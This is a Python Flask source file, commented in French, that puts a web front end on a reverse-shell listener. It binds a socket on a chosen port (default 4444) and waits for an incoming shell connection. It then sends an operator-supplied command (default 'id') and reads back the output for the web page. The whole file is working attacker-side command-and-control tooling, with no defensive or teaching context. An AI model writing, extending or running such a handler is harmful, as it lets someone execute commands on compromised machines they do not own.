from flask import Flask, render_template, request, jsonify
import threading
import socket
import time

app = Flask(__name__)

listener_thread = None
listener_active = False
listener_output = ""
conn = None

def run_listener(port, command):
    global listener_active, listener_output, conn
    listener_active = True
    listener_output = f"[+] Listener lancé sur le port {port}...\nEn attente de connexion..."
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', port))
            s.listen(1)
            s.settimeout(30)  # Timeout 30s pour connexion
            conn, addr = s.accept()
            listener_output += f"\n[+] Connexion reçue de {addr}."

            # Envoyer la commande + newline
            conn.sendall((command + "\n").encode())

            # Lire la réponse (max 1024 bytes ici, à adapter)
            time.sleep(1)  # Laisser le temps au shell d'exécuter
            conn.settimeout(2)
            data = b""
            try:
                while True:
                    chunk = conn.recv(1024)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass

            listener_output += f"\n[+] Résultat de `{command}` :\n" + data.decode(errors='ignore')

    except socket.timeout:
        listener_output += "\n[-] Timeout : aucune connexion reçue."
    except Exception as e:
        listener_output += f"\n[!] Erreur : {str(e)}"
    finally:
        listener_active = False
        if conn:
            conn.close()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start_listener", methods=["POST"])
def start_listener():
    global listener_thread, listener_active
    if not listener_active:
        port = int(request.json.get("port", 4444))
        command = request.json.get("command", "id")
        listener_thread = threading.Thread(target=run_listener, args=(port, command))
        listener_thread.start()
        return jsonify({"status": f"Listener démarré sur le port {port}..."})
    else:
        return jsonify({"status": "Listener déjà actif."})

@app.route("/listener_status")
def listener_status():
    return jsonify({"status": listener_output})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
